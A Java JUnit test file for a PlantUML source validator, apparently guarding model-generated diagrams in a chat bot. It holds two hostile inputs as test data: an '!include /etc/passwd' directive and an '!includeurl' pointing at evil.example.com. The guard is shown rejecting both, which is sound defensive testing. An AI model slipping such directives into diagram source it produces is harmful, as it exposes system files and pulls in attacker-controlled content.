package com.weida.bot.wechatilinkbot.infrastructure.diagram;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import org.junit.jupiter.api.Test;

class PlantumlSourceGuardTest {

    private final DiagramProperties properties = enabledProperties();

    private static DiagramProperties enabledProperties() {
        DiagramProperties properties = new DiagramProperties();
        properties.setEnabled(true);
        return properties;
    }

    @Test
    void rejectsDisabledConfiguration() {
        DiagramProperties disabled = new DiagramProperties();
        disabled.setEnabled(false);

        assertThatThrownBy(() -> PlantumlSourceGuard.validate("sequence",
                "@startuml\nA -> B\n@enduml", disabled))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_DISABLED));
    }

    @Test
    void rejectsMissingType() {
        assertThatThrownBy(() -> PlantumlSourceGuard.validate(null,
                "@startuml\nA -> B\n@enduml", properties))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_INVALID_TYPE));
    }

    @Test
    void rejectsTypeOutsideAllowlist() {
        assertThatThrownBy(() -> PlantumlSourceGuard.validate("bar_chart",
                "@startuml\nA -> B\n@enduml", properties))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_INVALID_TYPE));
    }

    @Test
    void acceptsTypeAfterNormalisation() {
        PlantumlSourceGuard.validate(" Sequence ",
                "@startuml\nA -> B\n@enduml", properties);
    }

    @Test
    void rejectsEmptySource() {
        assertThatThrownBy(() -> PlantumlSourceGuard.validate("sequence",
                "   \n  ", properties))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_SOURCE_REQUIRED));
    }

    @Test
    void rejectsSourceExceedingCharacterLimit() {
        DiagramProperties tight = enabledProperties();
        tight.setMaxSourceCharacters(32);

        assertThatThrownBy(() -> PlantumlSourceGuard.validate("sequence",
                "@startuml\nAlice -> Bob : hello world\n@enduml", tight))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_SOURCE_TOO_LONG));
    }

    @Test
    void rejectsSourceMissingStartMarker() {
        assertThatThrownBy(() -> PlantumlSourceGuard.validate("sequence",
                "A -> B\n@enduml", properties))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_FORBIDDEN_DIRECTIVE));
    }

    @Test
    void rejectsSourceMissingEndMarker() {
        assertThatThrownBy(() -> PlantumlSourceGuard.validate("sequence",
                "@startuml\nA -> B", properties))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_FORBIDDEN_DIRECTIVE));
    }

    @Test
    void acceptsAnyPlantumlStartMarker() {
        // Mind maps use @startmindmap/@endmindmap, WBS uses @startwbs,
        // etc. The guard must accept any @start.../@end... pair so the
        // model can pick the right marker for the diagram type.
        PlantumlSourceGuard.validate("mindmap",
                "@startmindmap\n* Root\n** Child\n@endmindmap", properties);
        PlantumlSourceGuard.validate("wbs",
                "@startwbs\n* Root\n** Child\n@endwbs", properties);
        PlantumlSourceGuard.validate("gantt",
                "@startgantt\n[Task1] lasts 5 days\n@endgantt", properties);
    }

    @Test
    void rejectsIncludePreprocessorDirective() {
        String source = "@startuml\n!include /etc/passwd\nA -> B\n@enduml";
        assertThatThrownBy(() -> PlantumlSourceGuard.validate("sequence", source, properties))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_FORBIDDEN_DIRECTIVE));
    }

    @Test
    void rejectsIncludeUrlPreprocessorDirective() {
        String source = "@startuml\n  !includeurl http://evil.example.com/x.iuml\nA -> B\n@enduml";
        assertThatThrownBy(() -> PlantumlSourceGuard.validate("sequence", source, properties))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_FORBIDDEN_DIRECTIVE));
    }

    @Test
    void rejectsImportAndPragmaDirectives() {
        assertThatThrownBy(() -> PlantumlSourceGuard.validate("sequence",
                "@startuml\n!import foo\nA -> B\n@enduml", properties))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_FORBIDDEN_DIRECTIVE));
        assertThatThrownBy(() -> PlantumlSourceGuard.validate("sequence",
                "@startuml\n!pragma useANSI true\nA -> B\n@enduml", properties))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_FORBIDDEN_DIRECTIVE));
    }

    @Test
    void rejectsSpriteInclude() {
        String source = "@startuml\nA -> {{sprite.png}}\n@enduml";
        assertThatThrownBy(() -> PlantumlSourceGuard.validate("sequence", source, properties))
                .isInstanceOf(DiagramException.class)
                .satisfies(error -> assertThat(((DiagramException) error).getCode())
                        .isEqualTo(DiagramErrorCode.DIAGRAM_FORBIDDEN_DIRECTIVE));
    }

    @Test
    void acceptsWellFormedSequenceSource() {
        PlantumlSourceGuard.validate("sequence",
                "@startuml\nAlice -> Bob : hello\nBob --> Alice : hi\n@enduml",
                properties);
    }
}